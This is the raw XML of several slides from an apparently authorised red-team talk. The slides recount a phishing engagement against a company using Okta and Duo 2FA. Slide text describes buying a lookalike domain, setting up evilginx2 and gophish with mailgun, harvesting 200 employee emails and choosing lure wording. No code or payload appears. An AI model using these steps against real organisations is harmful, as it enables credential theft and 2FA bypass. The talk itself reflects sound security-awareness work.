                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:endParaRPr sz="3100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-425450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="3100"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Said they'd pay per user</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="742" name="Shape 742"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="743" name="Google Shape;743;p90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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4" name="Google Shape;744;p90"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="745" name="Google Shape;745;p90"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1041700" y="266850"/>
            <a:ext cx="6902400" cy="723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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Phishing </a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="746" name="Google Shape;746;p90"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502625" y="1925425"/>
            <a:ext cx="8398200" cy="17085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 sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>They used Okta &amp; DUO 2FA</a:t>
            </a:r>
            <a:endParaRPr sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>https://&lt;not-a-casino&gt;.okta.com + Duo 2FA</a:t>
            </a:r>
            <a:endParaRPr sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="747" name="Google Shape;747;p90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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sld>
</file>

<file path=ppt/slides/slide7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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="751" name="Shape 751"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="752" name="Google Shape;752;p91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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3" name="Google Shape;753;p91"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="754" name="Google Shape;754;p91"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1041700" y="266850"/>
            <a:ext cx="6902400" cy="723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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Phishing </a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="755" name="Google Shape;755;p91"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="894175" y="1225300"/>
            <a:ext cx="8398200" cy="17085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 sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Bought a domain that looked similar to theirs.</a:t>
            </a:r>
            <a:endParaRPr sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Setup evilginx2 &amp; gophish (w/ mailgun)</a:t>
            </a:r>
            <a:endParaRPr sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="756" name="Google Shape;756;p91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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pic>
        <p:nvPicPr>
          <p:cNvPr id="757" name="Google Shape;757;p91"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1644985" y="3168950"/>
            <a:ext cx="5695826" cy="1793850"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="761" name="Shape 761"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="762" name="Google Shape;762;p92"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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3" name="Google Shape;763;p92"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="764" name="Google Shape;764;p92"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1041700" y="266850"/>
            <a:ext cx="6902400" cy="661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3100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Let's get 200 emails</a:t>
            </a:r>
            <a:endParaRPr sz="3100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="765" name="Google Shape;765;p92"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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pic>
        <p:nvPicPr>
          <p:cNvPr id="766" name="Google Shape;766;p92"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="4306" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2061775" y="1283300"/>
            <a:ext cx="4453600" cy="3170900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="767" name="Google Shape;767;p92"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="933450" y="4496600"/>
            <a:ext cx="7277100" cy="5388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b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Email format was flastname@example.com</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="771" name="Shape 771"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="772" name="Google Shape;772;p93"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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3" name="Google Shape;773;p93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="774" name="Google Shape;774;p93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1041700" y="266850"/>
            <a:ext cx="6902400" cy="677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3200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>What to say? (or not to say in hindsight)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="3200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="3200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="775" name="Google Shape;775;p93"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="776" name="Google Shape;776;p93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502625" y="1925425"/>
            <a:ext cx="8398200" cy="22395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b="1" lang="en" sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>I've never actually done a phishing </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>campaign</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t> against a company…what should the email say?</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="1" lang="en" sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>What would I fall for?</a:t>
            </a:r>
            <a:endParaRPr b="1" i="1" sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="780" name="Shape 780"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="781" name="Google Shape;781;p94"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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2" name="Google Shape;782;p94"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="783" name="Google Shape;783;p94"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502625" y="1925425"/>
            <a:ext cx="8398200" cy="6465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t/>
            </a:r>
            <a:endParaRPr sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="784" name="Google Shape;784;p94"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1541975" y="899451"/>
            <a:ext cx="6060049" cy="3973800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="785" name="Google Shape;785;p94"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1635450" y="216400"/>
            <a:ext cx="5873100" cy="488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200">
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>It was rough…and I'm a douche for doing this 😅</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2200">
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="786" name="Google Shape;786;p94"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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sld>
